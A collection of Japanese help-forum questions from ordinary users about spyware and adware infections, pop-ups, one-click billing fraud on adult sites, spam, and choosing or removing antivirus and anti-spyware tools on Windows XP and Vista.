娘が何かの拍子に、開いた迷惑メールからいかがわしいサイトのポップアップが何重にも開いてしまって大変困っています。 使用のPCは、Win XPです。セキュリティソフトでスキャンすると、どうもスパイウェアに感染しているようなので何とか駆除や削除を試みたのですが、何度やっても駆除しますか？のメッセージが出ます。 ローカルフォルダにそのファイルが入っているようなのですが、見当たりません。 クレジットカードでの買い物もしますし、情報を盗まれるのではないかと心配しています。 そしていかがわしいサイトのポップアップが出るので、あまり子供たちには見せられないので何とかしたいのですが、ポップアップロックも効かないので大変困っております。 何とかする方法はあるでしょうか？
http://www.eset.com/download/ の Home Users の Try ESET NOD32 Antivirus free for 30 days: click here. をクリックしてダウンロードできる eav_nt32_enu.msi というファイルのサイズがページには１５Mバイトって かいてあったのに ダウンロードしたら 19.5 MB (20,465,152 バイト) でした。本当のサイズわかりますか？ 32bit版です。 ほかに問い合わせてください、とかいう回答は できればしないでください。
プロテクションを起動していると、「リスクウェア Invader を検知しました: C:\WINDOWS\system32\svchost.exe」が表示されました。 ウィルスかと思いこれを削除したいのですが、削除すべきではないなのですか？もし可能ならどうやって削除すればいいのですか？ カスペルスキーのスキャン結果では典型的なマルウェアと表示されています。 kaspersky 7.0 windows XP 富士通FMV L50G　　を使用しています。
富士通のノートパソコンを使っています。 ノートンでウィルススキャンをしたところ、「トラッキングクッキー」が入っていると言われ、除去(解決する)をしたのですが、どうしても除去できていないようです。 トラッキングクッキーとはどのようなものか？ どのようにしたら完全に除去できるのか？ 教えてください。 ちなみにトラッキングクッキーの内容は owner@ad.spacehunter.drecom.jp/ad です。
ウイルス対策としてＳＯＵＲＣＥＮＥＸＴ社のウイルスセキュリティというソフトを使っているのですが、知人から「ＳＰｙｐｏｄというソフトもいれるといいよ。」と勧められたのですが必要でしょうか。ウイルスとスパイウエアとは異なるものなので、ウイルス対策以外にスパイウェア対策というソフトも必要だというのですが、どうでしょうか。どなたか詳しい方お願いします。
今、その友達の家のパソコンでこの質問をしています 前にもこういうことあり、アンチフリーソフトを入れていたわけですが 外国の広告がでたり、音が変になったりという状況です どんなアンチフリーソフトがお勧めでしょうか？ ちなみに今入れているのがアドウェアとスパイボットとAVGです
有料サイトにてクリックしてしまい入会完了画面表示がデスクトップ上に表示され、2.3分毎に画面に現れてしまいます。無視してはいますが、この画面、この先ずっと、表示されるのでしょうか。削除する事は出来ないのでしょうか。
FIREFOXPORTABLE や　portableSleipenir　を使っていますが、SPYBOTで何も検出されません。（以前通常版使用時は、特定のページに行った後には必ずスパイウエアが入っていた。） もしかして、レジストリを使わないポータブル版はスパイウエア検出ソフト（アンチウイルスソフトも？？）が検索してくれないのでしょうか？？
Spybot S&D 1.4でスパイウェアのスキャン中に『 include ファイルに問題があります C:\Program File\Spybot - Search_Destroy\Include\TrojansC.sbi　詳細は 'Include errors.log'を確認して下さい。』の警告メッセージが表示されます。 上記のエラーに関する過去ログを参考にして、 (1)Trojanｃ.sbiを再読み込みしても、(2)TCPIPAddress.dllを再読み込みしても、(3)spybotを再インストールしても上記の警告メッセージが出ます。 これら以外に、どんな対策が可能なんでしょうか。 ちなみにspybotのInclude errors.logの内容は以下の通りです。 C:\Program Files\FreePrograms\Spybot - Search & Destroy\Includes\Trojans.sbi | Win32.Agent.frl | <$FILE_EXE> C:\Program Files\FreePrograms\Spybot - Search & Destroy\Includes\TrojansC.sbi | Zlob.DNSChanger | <$FILE_EXE> C:\Program Files\FreePrograms\Spybot - Search & Destroy\Includes\TrojansC.sbi | Zlob.DNSChanger | <$FILE_EXE> C:\Program Files\FreePrograms\Spybot - Search & Destroy\Includes\TrojansC.sbi | Zlob.DNSChanger.rtk | <$FILE_EXE> C:\Program Files\FreePrograms\Spybot - Search & Destroy\Includes\Trojans.sbi | Win32.Agent.frl | <$FILE_SYSTEM> C:\Program Files\FreePrograms\Spybot - Search & Destroy\Includes\Trojans.sbi | Win32.Agent.frl | <$FILE_EXE> C:\Program Files\FreePrograms\Spybot - Search & Destroy\Includes\TrojansC.sbi | Zlob.DNSChanger | <$FILE_EXE> C:\Program Files\FreePrograms\Spybot - Search & Destroy\Includes\TrojansC.sbi | Zlob.DNSChanger | <$FILE_EXE> C:\Program Files\FreePrograms\Spybot - Search & Destroy\Includes\TrojansC.sbi | Zlob.DNSChanger.rtk | <$FILE_EXE> よろしくお願いします。 OSはXPーSP2です。
芸能ネタのサイト（スターピーチ ）を閲覧しようとクリックしたところ、データ取得中という画面になり画面が黒くなりプログラムが動き、その後、登録完了が出てきました。 このような勝手に会員登録される場合どのような事が起こるのでしょうか？ またどのような対応をしたらよいでしょうか？ 退会処理は必要なのでしょうか？ ウイルス・スパイウェアに関しては大丈夫でしょうか？ データの取得では何を取得されるのでしょうか？ よろしくお願いいたします。 今後今までどおりＰＣを使用ても大丈夫でしょうか？ また何か使用しない方がいい事などありますでしょうか？
今windows xp　を使っています。普通にインターネットを使っていると、勝手に広告のようなウェブサイトが出てきます。spybotもセーフモードでつかって怪しいと思われるものは削除したはずなんですが、まだ解決しません。出てくるウェブサイトのアドレスはいつもCiD:http://www.adserver5.com　から始まるアドレスのサイトが出てくる気がします。なにか解決策をご存知の方教えてください。よろしくお願いします。
今いち詳しくないので知りたいんですが フリーソフトのスパイウェアはアップデート（更新） 常に最新の状態に自動的に開始されるもんなんですか？ フリーソフトに関してはサポートはされないと聞きますが？ よくわからず質問しました よろしくお願いします。
たとえばホームページなどに設置されている掲示板などに書き込みをした場合、そのホームページの管理者などに個人情報を知られずにすむ方法はないですか？たとえばＩＰアドレスやプロバイダ情報などです。 違法な書き込みなどをするのが目的ではなく、あくまで個人を特定されたくない旨知っておきたいです。宜しくお願いいたします。
spywarblasterを削除したいのですが、英文の為解りません。 ウィルスバスターをアップデートするのにじゃまなようです、 Windous Xpでspywareblaster3.2です。 よろしくお願いします
スパイウェア削除ソフトは Ad-Aware2007フリー版とSpybotどちらが良いのでしょうか？ Ad-Aware2007フリー版はアップデートなどエラーが良く起こり不安なのですが・・？ お勧めのソフトを教えて下さい。
こんばんは。 Ｎｏｒｔｏｎ Ｉｎｔｅｒｎｅｔ Ｓｅｃｕｒｉｔｙ２００８　 ２００５の時は「カスタムＩＤ」が有ったと思いもですが 「２００８は「カスタムＩＤ」に変わり「Ｎｏｒｔｏｎアカウントパスワード」に成ったんですか・・・？ ２００８に「カスタムＩＤ」ないですよね・・？
　自作サーバー内にホームページを作成したのですが、このホームページだけファイアーウオールを解除する方法を教えて下さい。 　そして、自作サーバー内ホームページへのアクセス権を与えた人にだけアクセスできる方法がウイルスセキュリティで設定可能なのでしょうか？
お恥かしい話ですが・・・あまりパソコン操作に詳しくないのですが、エロ動画のサイトを閲覧してたらクリックを間違ったのか、有料サイトにアクセスされたみたいです。他のサイトの無料サンプル動画もかなり見ましたが、個人情報やメールアドレスなどは一切アクセスしていません。勿論有料サイトからの情報詳細のページにもまだアクセスしていませんが、外国物の番組もかなりみました。時間にしたら1０秒間ぐらいの動画や画像です。これって有料サイトにアクセスして確かめた方が良いですか？それともこのままほっといていいものでしょうか？こうしてメールしてる間も有料サイトからのアクセス画像が出ます・・・ただ、アダルトサイトのお試しサンプルのダウンロードはかなりしましたが・・・パソコンのアダルトサイトに詳しい方、何か良い解決策をお願い致します。
困っています。どなたか教えてください。 元アイドルの殺人事件ニュースを閲覧しているうち、アダルトサイトに移動しました。つい興味を持って、ろくに説明も読まずに動画閲覧に「ENTER」したところ、ＤＯＳの画面が開き「情報を取得している」というような日本語の文章が目につきました。 あっという間にＤＯＳの画面が閉じ、次にウィルスバスターのWebアクセス規制の表示がされました。 動画閲覧はしていませんが、再度説明を確認したところ、「ENTER」＝登録＝利用料金\90,000　と書かれていました。 この状況は、ＰＣ内の情報が相手先に送信されたということでしょうか？　また、利用料金の請求をされるのでしょうか？ こういうのをスパイウェアというのかどうかも分かりませんが、冷や汗をかいています。どなたか教えてください。
パソコンを起動するたびに。「RealPlayerのセットアップ」という画面が出てきて。＜Reaiplayerをインストールするためには、このコンピュータをインターネットに接続する必要があります。インターネットの説続を確認してから[再試行]をクリックし、インストールを完了して下さい。＞このようなコメントがあります。もしかしたらウイルスのような感じもします。この画面が出てこないようにするにはどうしたらよいでしょうか？教えて下さい。
前は出来ていたyou tubuのダウンロードが、今は２種類のソフトを使っても出来ません。何故でしょうか。
PC-cleanとウィルスバスターを使っています。PC-cleanは自動更新されるのでしょうか。これを使って検索しても何もみつからないのに、ウィルスバスターで検索するとスパイウェアがいくつか見つかります。自動更新されていないのではないかと思い、PC-cleanを更新しようと思っても、どこで更新すればよいのかが分かりません。実際どうなっているのでしょうか。
最近、パソコンの電源を入れると勝手に外国のHPが多数開き困っています。 Spyware Docotorをインストールして削除しても翌日にはHPが多数ひらきます。 皆様宜しくお願いします！
こんにちは。 Ｎｏｒｔｏｎ Ｉｎｔｅｒｎｅｔ Ｓｅｃｕｒｉｔｙ２００８リスクありと出ます、今すぐ解決をクリックするとＬｉｖｅＵｐｄａｔｅが実行され、新しい更新は見つかりませんでした。と成りますが、リスクあり、のままです。 ＩＥ６からＩＥ７に変えたから・・・。。 ＩＥ７　　ＯＳ　ＸＰです。 よろしくお願いします。
パソコン初心者です ステータスバー？に黄色い三角のストップマークみたいなのが勝手に出てきました。 PCを開いているとその黄色い所から英語でスパイがどうたらとか表示され、勝手にスパイウェアダウンロードのサイトが開いてしまうようになりました。 しかもインターネットを開くとダウンロードの画面が最初に出てきてしまいます。 インターネットオプションからそのサイトをアクセス禁止にしても、効果がありません 黄色い三角をアンインストールしようにもどこですればいいのか分かりません どうすればいいのか、分かる方がらっしゃったら教えて下さい
Spybot　 Spyware Blaster ZoneAlarm AVG この組み合わせで全て今日現在で最新のバージョンで新規インストールしました。 Spyware Blaster以外は全て日本語版です。 全てのソフトのアップデートや免疫化等の設定も済ませてあります。 そこでPC Security Testの2007のバージョンだったと思いますが、このソフトで上記のセキュリティーソフトが働いてるかチェックしたところスパイウェア対策ソフトに関しては０％という結果が出てしまいました。 AVGに関しても３０％です。 ハッキングに関しては０％でした。 セキュリティーソフトの実力がその程度なのか、PC Security Testというソフトの信頼性が悪いのか、この結果をどう見ればいいのか分かりません。 どなたかこの結果と対処法について教えてください。 よろしくお願いします。
XPでNIS2007を使用しています。 セキュリティインスペクタでスキャンしたらIPアドレスの項目で脆弱性が見つかりました。 修復すると今度はスパイボットのWindows Global(Hosts)の免疫化が無効になります。 免疫化するとまた脆弱性が見つかったと出てきます。 つい最近スパイボットを1.5.2にしました。前の時は問題なかったです。 そこまでは分かったのですが、これをどうしたらいいのか・・・。 セキュリティインスペクタからIPアドレスのチェックを外して使っても問題ないのでしょうか？ それともスパイボットの免疫化を無効にした方がいいのでしょうか？ そもそもこの2つの項目が何を意味しているのかすらあまりよく分かっていないもので・・・(^^ゞ うまく質問できてないかもしれませんが、どうすればいいのか教えて下さいm(__)m あと、もしかしてNIS2008にすれば解決するのでしょうか？
ある掲示板でトピックに対してレスをしようとレスをするボタンを クリックすると別窓が開いて通常なら入力する画面になるのですが 昨日から「about blunk」とだけ書いてある青い枠で中は真っ白に なっている別窓が開くだけになってしまいました。 ホームページが書き換えられる about blunk スパイウェアがある と知ったのですが、特定掲示板の「レスをする」をクリックすると 出るのですが、これも同じスパイウェアの症状なのでしょうか？ ウイルスバスターやその他検索しても出てこないし、治すことが 出来ず困っています。 その掲示板は通常の状態でも「レスをする」を押すと最初にチラっ とabout blunk が出た後でhttpから始まるアドレスが出ます。 どうしたらレスを通常通りすることが出来るようになるのでしょう か？ 今は手元にある違うPCから書き込んでいます。 WinXP IE6.0
自分のことではないのですが友人から相談を受けましたのでよろしくお願いします。 友人はウインドウズＸＰを使用していて、ウィルスソフトは３年前購入時バンドルのものを使用し期限切れ後は更新はしていないとのことです。 またウインドウズのアップデートもしていないとのことです。 症状は、その日、最初にインターネットエクスプローラーを立ち上げると、「Family Casino」「DISK　CLEANER」「ベラサーチ」という外国サイトが表示されてしまう。 通常のブックマークの中で特定のものをクリックすると同様のサイトが表示される。 １日１回だけなのでそのサイトを閉じれば、その後問題はない。 おそらくアドウエアというもののようですが私にはよく分かりません。 一応、ウインドウズのアップデート、IEを7.0にアップデートを薦めましたが上記海外サイトはやはり立ち上がってしまうようです。 またオンラインウイルススキャンを実施してもらったところウイルスは発見されなかったとのことです。 ブラウザをファイアフォックスに変えるようにも薦めてみました。 こういったアドウエアを削除できるのでしょうか？ ブラウザをファイアフォックスにすると問題解決になるでしょうか？（その場合ブックマークをIEから引き継ぐとアドウエアも引き継いでしまうのでしょうか？） ご回答よろしくお願いします。（友人にはアンティウイルスソフトの導入などを薦めています）
パソコンのメンテナンスをしようと思い色々なサイトを見ておりました。レジストリの整理と言うような操作方法があるみたいですが私のＯＳウィンドウズ２０００のやり方は載っていませんでした。ウィンドウズＭｅのやり方が載っていました。 Ｗｉｎｄｏｗｓ2000 Ｓｅｒｖｉｃｅ Ｐａｃｋ 4 東芝ノートパソコンdynabook satellite 2650 営業型番PD265C464DABを使っています。 このパソコンはＷｉｎｄｏｗｓ９８から２０００ Ｓｅｒｖｉｃｅ Ｐａｃｋ ４にアップデートしたＯＳを使っています。 このＯＳのレジストリについて日本語のフリーソフトがあったら教えて下さい。 http://www.larshederer.homepage.t-online.de/erunt/を見ましたが英語なので良くわかりません。又ウィンドウズ２０００のレジストリについて詳しく書かれた日本語のサイトがあったら教えて下さい。 このパソコンは９９年に買ってから約９年間レジストリについて何も操作をしていません。一日約６時間、毎日このパソコンを使用しています。購入後から９年間使っており未だに使えます。 このパソコンのローカルディスクのｃドライブ、ハードディスクの交換は一度もしていません。
avastで検査した所、win32 rootkit が2体発見されました。 調べて見た所、手動で取り除くのは難しいとの事だったので、 ウィルスを avast のチェストに入れたまま、 avast をアンインストールし　カスペルスキー　の体験版を入れました。 その後、カスペルキーの完全スキャンをしてみたのですが、ウイルスは検知されませんでした。 同様にルートキットスキャンをしてみても検知されませんでした。 おかしいなと思い、システマティックのオンラインスキャンをしてみたのですが、 やはり検知されませんでした。 チェストに入れたまま avast をアンインストールしてしまったのがいけなかったのでしょうか？ また、ウイルスは検知できない所まで潜り込んでしまったのでしょうか？ 対処方法を教えてください。よろしくお願いします。
パソコン初心者です。ホームページ閲覧で邪魔なのをマウスで移動させようと誤ってクリックしました。英語のセキュリティの案内が全体に赤色がありパソコンの右下に△が点滅英語で何か書いてあるのが出て×で消しても頻繁に出ます。何もしていないのに勝手にセキュリティが出ます。アプデートをしようとクリックすると汚染されているメッセージがでます。何が正しいのか判らず、困っています。 Outlook　Expressも左以外真っ白になっています。 Spybotのダウンロードを試みましたが、「このセキュリティではできません」がでます。 セキュリティとはインターネットのセキュリティでしょうか？ セキュリティをどのようにすれば良いのでしょうか？ 教えて下さい。
先程も質問させてもらいましたが、ちょっと違うので質問させてもらいます。 まず、インターネットを開くと一応開くのですが しばらくするとフリーズして「このプログラムは応答しません。」などが出たり、ダウンロードしてる物が使えなくなってたりします・・・。 やっぱりウィルスでしょうか？ ウィルスバスターの体験版でも、まだスキャンしていないのに 実行中ですなどと出たりして困っています・・・。 いざとなればPCを初期化しようかと・・・ 一応PCの初期化のやり方も詳しく教えてくれませんか？
こんにちは。 Windows VistaのSP1を使用しています。 先日、オンライン無料スパイウェア検出・除去サービスをあるサイトで利用したところ、Adware:Win32/windupdates.Eというスパイウェアが検出されました。 指示に従って削除し、PCを再起動して再び検索してみたところ同じスパイウェアが出てきてしまいました。 何度やっても同じなので、spybotなどをダウンロードしようか考えているのですが、すでにPCにはウイルスセキュリティZEROをいれています。 spybotとZEROは併用できるのでしょうか？ (ちなみに、ZEROではスパイウェアは一つも検出されませんでした。) 初心者なので、このスパイウェアに対してどうすればいいのかまったくわかりません。 詳しい方、アドバイスをよろしくお願いいたします。
この間も質問させていただいたのですけど プログラム検索でshare入れたら shareが発見されてプロパティで調べたらC:\\Windows\\System32というもの中にあるようなんです。 これはwinny同様に噂になっているshareとは関係あるのでしょうか？ もし関係があるのであるなら削除の仕方を教えてください。 問題がないのであればこのshareとは何か教えてください。 ちなみにPCはVISTAです。
みなさん、こんにちは。 自分の、パソコンは直ぐにフリーズしてしまいます。このサイトに来る間にも何回も何回もフリーズして、ようやくここまでたどり着くことができました。 実は、パソコンが急に調子が悪くなったのには心当たりが有りまして、以前、「クロスファイア」というオンラインゲームをやっていたところ急に画面に〔スピ？ドハックに感染しました。〕という文字が現れ、ゲームを中断されました。その後、何の支障もなく、ゲームをやっていると、再び〔スピ？ドハックに感染しました。〕という文字が現れ先ほどと同じようになり、中断されました。それから、私は、インターネットを開いていたのですが、動きが鈍く、ついにはフリーズしてしまいました。 そこで、僕は、強制終了し再度、インターネットを試みたのですが先ほどかいように、何回もフリーズしてしまいます。 ～avast～という、アンチウィルスソフトはインストールしているのですが、追いついてないみたいです。 これは、ゲーム内の誰かがやった仕業なのでしょうか？ 誰か、早いところ対処法を教えて下さい。お願いします。
最近、Spybot-Search＆Destroy1.5を立ち上げるのに時間がかなりかかります。およそ１分位かかります。以前はすぐに起動出来ました。 それとスキャンしている途中にいきなり電源が落ちる様になりました。 今まで３回なりました。画面が待機画面になってからです。待機にしないようにマウスをわざと動かしているとなりません。 もしかしたら？待機にする設定が影響するのですか？ 　昨日、スキャンしていて今まで経験の無い警告文がでました。この件でも 宜しくお願い致します。 　警告！　inciudeファイルに問題があります。 C:\Program Fils\Spybot-Search_Destroy\Includes\TrojansC.sbi... 詳細は 　’Includesu erros.log'を確認して下さい。 　　と言う表示がありました。 　　宜しくお願い致します。
自分のパソコンでshareと検索してみたらプログラムの中に 入っていたのですけど問題はありますか？ 一応不安なので削除しようと思っているのですけど 削除はできますか？ それと元々このソフト入っているものなのですか？ 教えてください。
AVG free edition を使用中です。Ver.7.5ですが、ウイルス検知のみです。AVGも結局、その他のSPYウエア、コピー詐欺など、欲しい機能は、ありません。フリーソフトの良いソフトは今の時代はなんですかね？スパイウエア、ウイルスと、フィッシング詐欺に対応したアプリで安いのはどこのですか？
英語のメールが毎日届きます。内容はわからないので、すべて削除してますが大変な作業です。ＰＢに問い合わせたところ、振り分けルール設定すればよいとのことでしたがよくわかりません。メーラーのヘルプを参照するようにとのことでしたが、こちらもよくわかりません。 誰か教えてもらえませんか。
WindowsVistaです。WindowsDefenderは何故か動作停止していて 他の常駐スパイウェア対策ソフトを探しています。 Ｓafariを標準ブラウザとして使っていてＳｐｙｂｏｔなどでは保護不可能です。 ＳｐｙｗａｒｅＴｅｒｍｉｎａｔｏｒというソフトを前は使っていましたが、重いし 検出率が低いと聞いて少し嫌です。 何か常駐して、フリー、Ｖｉｓｔａ対応のソフトが欲しいです！ また自分なりに探してみたソフトは何故か動作停止します。 これはなぜでしょうか・・・
スパムファイター・プロを利用しております。ハードデスクを交換した後、再インストールしたいのですが、説明が英文なので、やり方がわかりません。教えてください。
Anti Spyware Master このソフトは怪しいものなのかどうか教えていただけますか？ アンインストールしても削除できないため困っています。 わかる方は回答お願いいたします。
最近ＰＣの安全が気になりSpyware Doctorの無料版をつかって、スキャンをしてみたところ Trojan.Popuperというの検出されました。 無料版でしたので駆除することはできませんでしたが、 結構危険なものなので駆除したいです。 どうすれば駆除することができますか？ 回答宜しくお願いします。
ｗindowsVistaです。一時期ＷＤをシステム構成ユーティリティで無効にしていたときが有りました。 その後管理ツールでＯＮにして、ＷＤを動くようにし、またシステム構成 で有効化してるか確認しました(ＯＮでした)。 しかしＷＤの起動はでき、設定でリアルタイムの監視をさせるようにしてるのに タスクに常駐していません。どうすればアイコン表示されるでしょうか？ 管理ツールでは　有効　に設定しています。
ローカルディスクC-Documents and Settings-ユーザー名-Cookies の中のファイル名の一文字（@の前にあるユーザー名の一文字） が書き換えられてしまいます。 １）正常に直すにはどうしたらよいでしょうか？ ２）Cookiesの中のファイルはExplorerでサイトを訪問するたびに 増えていってますが、正常でしょうか？ ３）人に書き換えられたとしたら、書き換えた人にどのような情報が 漏れてしまったのでしょうか？ よろしくお願いします。
有料のウィルス対策ソフトとしてメジャーなものとしては… ・ノートン ・ウイルスバスター ・カスペルスキー ・マカフィー ・ウィルスセキュリティ などがあり、普通に店頭などでも手に入れることができると思いますが 有料のスパイウェア対策ソフトでメジャーなソフトといえば 現在では何になるのでしょうか? 無料で多くの方が進めているSpybotやAD-AWAREなどは知っていますが サポートが無く、自分でカスタマイズするほどの知識を持っていませんので やはり普通に店頭で買うことのできる"有料"ソフトの方が安心できるところがあります。 有料のスパイウェア対策ソフトとしてメジャーなものと その中でも比較的評判が良いソフトを教えて下さいませんか?
zonealarmにてsxml.exeというアプリのネット接続を確認しました。 調べてみたところ、下記URLに新しいマルウェアだと表示されました http://www.incodesolutions.com/threats2/System32 … 削除の方法を探したのですが、英語サイトしかなく、要領を得ません。 zonealarmで接続拒否してあるので実害はありませんが あまり気持ちの良いものではありませんので削除したいのですが 方法がわかる方はいらっしゃいますでしょうか？ 他にはavastとspybotをインストールしています。
パソコン初心者です。少し前に間違えて海外のフリーのソフトウエアをダウンロードしました。それは、プログラムから削除したのですが、それ以降、インターネットを開くと海外のアダルトサイトなどが勝手に一緒に開いてしまいます。 Ad-AwareとSpybotとフレッツのウイルスクリアはやっているのですが、いっこうになくなりません。 どうすればいいか全然わからないので教えてください。 宜しくお願いします。
Ｘcleanマイクロスキャナでスパイウェアチェックをしていると、Dialer:Win32/EGroup.Gと言うWindwos Dfenderの警告が出てスキャンが中断してしまい、すべて削除、確認、無視のボタンが表示され、スキャンできません。 過去にはこんな警告は出た事はなかったのですが、今日になって初めて出ました。　 訳がわからないまま削除しましたが、またマイクロスキャナを起動させると同じような警告が表示されます。 この場合、無視してもいいのでしょうか？ 確認をクリックすると次のように表示します カテゴリ ダイヤラ 説明： このプログラムは、有料番号にダイヤルし、電話料金を発生させます。 アドバイス： 警告の詳細を参照して、ソフトウェアが検出された理由を確認します。ソフトウェアの操作方法が気に入らない場合や、発行者を認識および信頼していない場合には、このソフトウェアをブロックまたは削除することを検討してください。 概要： アプリケーションが変更されました。 このエージェントは、ソフトウェアが実行される前にスキャンを実行します。ソフトウェアが問題を起こす可能性が高い場合に警告します。 よいアドバイスを宜しくお願いします。
Windowsなどからセキュリティーの配信がありますが、セキュリティーホールをそのままにしておくとどういったことが起こりますか？ セキュリティホールにも大小があるのでしょうか。 教えてください。
WindowsvistaのPC上に自分と家族2人をユーザ登録して各ユーザからインターネットに接続されることを確認しました。Macafee試供版をインストールしたところ、自分のサイトからはインターネット接続はできますが、家族ユーザPCからインターネット接続すると「要求された、Webページはマカフィーによってブロックされました」のメッセージが出て接続できません。Macafeeの設定を無効にしたが、同じです。回線はBフレッツです。解決方法を教えてください。
インターネットバンキングのパスワードを読み取ってしまうような スパイウェアやウィルスは、存在しますか？ よろしくお願いします。
Outlookで迷惑メールが届くようになりました。 ドメインが"@yahoo.co.jp"のメールが多いのですが、メールルールで 「送信者に@yahoo.co.jpが含まれるメールをサーバーからダウンロードしない」または「サーバーから削除する」を設定しても、受信してしまいます。 確実に受信拒否する方法はないでしょうか。 よろしくお願いいたします。
これまでルーターを使ってインターネット接続をしていたのですが(Bフレッツ）、住んでいるマンションで無料でインターネットが使えるようになったので、LANケーブルを直接つないでインターネット接続しています。 直接LANケーブルをつないでる場合は、やはり不正侵入される可能性が高くなるのでしょうか？ ファイアーウォールソフトは必要ですか？ もし必要な場合はウィルスバスターのパーソナルファイアーウォールでは大丈夫ですか？ 初歩的な質問ですが、詳しい方教えてください。 宜しくお願いします。
PC歴は長いですが、外部からの脅威に対するものに対しては初心者です。 少し前からグーグルディスクトップをディスクトップに表示している状態です。（実際はあまり使用していません。） ひょんな事から画面左上に「Gooｇleデスクトップ」名のついた検索サイトらしきホームページ？が表示されました。 そして、 ●デスクトップ：すべて - 0 メール - 3 ファイル - 0 ウェブの履歴 - 0 チャット - 0 その他 と表示され、「3 ファイル」のところが色が濃く表示されています。以下 検索結果という形で3件表されていて（内容は全て同じものですが）、私個人のカードの暗証番号などを一覧にしたエクセルの表がでています。 1）これは単純に私個人のPCの中での、自分だけの検索結果なのでしょうか（特に検索した覚えは無いのですが・・・・） 2）広く誰でも検索して見られてしまうものなのか？（当然暗証番号などの一覧なので他の人に見られては困るものです。） このへんがよく自分でも分かりません。 初心者でよく理解できていない部分もあります。 よきアドバイスを宜しくお願い致します。
以前使っていたパソコンのHDDをデータ移行の目的で保存していた のですが、何度目かの使用時に急にウイルス警告が出てきました。 念のためと思い全ファイルをスキャンしたところ、恐ろしくも 9つのウイルス（スパイウェア？）が発見されました。 種類は、トロイの木馬、daialer、adware.cool webなんとかなど。 調べた所、勝手に有料回線に接続したりパスワードを送信すると 書いてあり、急に不安になってきました。 ウェブサイトには危険性が極めて低いウイルスと書かれていましたが、 過去に金額請求があったり、大事なパスワードが流出していたのでは と心配です。 一度感染を確認した後も、無防備なまま2年ほどフル活用していた という環境なので自業自得なのですが、ウイルスの危険性など 詳しい方がいらしたら教えていただきたいです。 どうぞよろしくお願いいたします。
ＲＢＬ．ＪＰでマイIPアドレスチェックをすると毎回のように下の記述が出てきます。 この理由と対策をお教えください。確かにＡＤＳＬの接続を切ると解決をしますが、かなり頻雑なので困っています。 『アドレスチェック結果 　あなたのIPアドレス ：：：：： は 　IP ブラックリストに掲載されています：メールを送ることができ　　ない場合があります 　状況にもよりますがこれを解決するには一旦ADSLなどの接続を切っ　てしばらく待ち、最接続すると新しいアドレスが割り当てられて問　題が無くなるはずです』
昨日不審なメールを開けてしまいました。 勿論添付ファイルなど無かったのですが、 スパイウェアなどに感染する？ことはこの行為で発生しますか？　このメールの内容はよくある 不特定者へのＳＰＡＭだと思われ、他のサイトへの誘導アドが文面にありました。 私は、添付の無いメールを空けただけで何か情報が取られるようなことがあるとは思わなかったのですがあるんでしょうか？
情けない話ですが、アダルトサイトにて、動画閲覧申込みパスワード を興味本位で入力したとたん登録完了となってしまい お客様の会員ID S4G428112 お客様のご入会日 2008年03月28日 サービスご利用期間 120日間見放題 お支払い料金 3/29まで、45,000円 それを過ぎて、 3/30 にお支払いの場合、89,000円 （期日が土日にあたる場合は、翌営業日まで） お振込み人氏名 （振込み依頼人名の欄に右の会員+お名前（苗字）をご入力してお振込み下さい） S4G428112+お名前（ご苗字） といった、「課金システムが稼動しています。」という画面になってしまいました。 この場合、私には支払いの義務は発生するのでしょうか？ 私の不注意ではありますが、とても不安で皆様の知恵をお借りできますでしょうか？宜しく御願いいたします。
ネットワーク環境の中に見慣れないファイルが設定してあるのを見つけました。そのファイル名は、「私の友人名からOOOへ」となっており、OOOの部分は家族の父のニックネームです。それを何度か消去しましたが、何度も再設定してあります。どうすれば、そのようなファイルをネットワーク上に設定不可能にできるでしょうか？　またネットワーク環境内で消去しただけではだめなのでしょうか？ Windows XP使用で、家庭内はワイヤレスLANでネットワーク上家族のPCとつながっている状態です。
ＡＶＧ7.5フリー版を使っています。 自分でエクセルやワードで作ったファイルを開くときにも「ウイルス検査をしています」と出ますが、自分で作ったファイルはウイルス検査をしないように設定できないのでしょうか？ ご教示ください。
WindowsXPのマイネットワークのインターネットの項目に、 note - www.ringolab.com というものがありました。 一体、これは何でしょうか？ スパイウェアの類でしょうか？ 検索しても分からずに困っています。 ご存じの方、どうかご教授下さいませ。
Yahooのフリーメールを利用したスパムメールが多量に来るので困ってます。Yahooに問合せても、自分のところに来るスパム対策の話ばかりで、普通のメールアドレスに送りつけられるyahooからのメールについては全く責任を負ってくれません。無責任な話だと思いますが、どなたか受信拒否する方法を教えていただけないでしょうか。
こんにちは。 先日、不審なメールが来て何気にクリックしたら、出会い系サイトからでした。 大して内容も見ずに削除しましたが、送信済みメールにそのメールへの返信メールがありました。 どうやらクリックと同時に送られたようです。 その送信済みメールには添付ファイルが付いていました。 どんな内容が相手に送られてしまったのか心配です。 スパイウェアでしょうか？ 回答、宜しくお願い致します。
昨晩インターネットをしていたときにあるアダルトサイトに迷い込んでしまい、ワンクリック詐欺にあってしまったかもしれません。 年齢確認をするところに確かに「18歳未満は入場禁止」「クリックすると90,000円をお支払いいただきます」と書いてあったのですが、私は18歳以上であったため、読まずに入場してしまいました。 その後すぐに「IPアドレス(？)のようなものが判断された」のような言葉が現れ、「入会しました」となってしまいました。そこで怖くなり、ページを細かく見ずにブラウザを閉じてしまいました。 このクリックしただけで、住所や名前、メールアドレスが相手側に知られてしまうということはあるのでしょうか？ 多くの詐欺についての情報ページには、料金について書いていないページから入場した場合は無視して構わないと書いててあったのですが、私の場合は詐欺ではないのでしょうか？ 映像送信型性風俗特殊営業営業開始届出済なども書いてあり、合法なものなのでしょうか？ このようなものに初めて引っかかってしまい、動揺しています…。軽率に「同意します」などのボタンを押してしまい、私自身にかなり非が有ったのも確かなのですが、どうしたらいいのでしょうか？ よろしければアドバイス頂けるとありがたいです。
日本語化解く前にアンインストールしちゃったからか Ad-aware.exeがProgram Files内に残っちゃって、アンインストーラもないし Ad-aware.exeクリックすると、コンポネートが見つかりません。 もう一度入れなおせば解決するかもしれません。 ってエラー出るんです。 スパイボットはAd-awareがインストールされてると認識してます。 Ad-awareはプログラムの追加と消去にはありません。 日本語化は正常に解く事ができました。 どうすればいいですか？
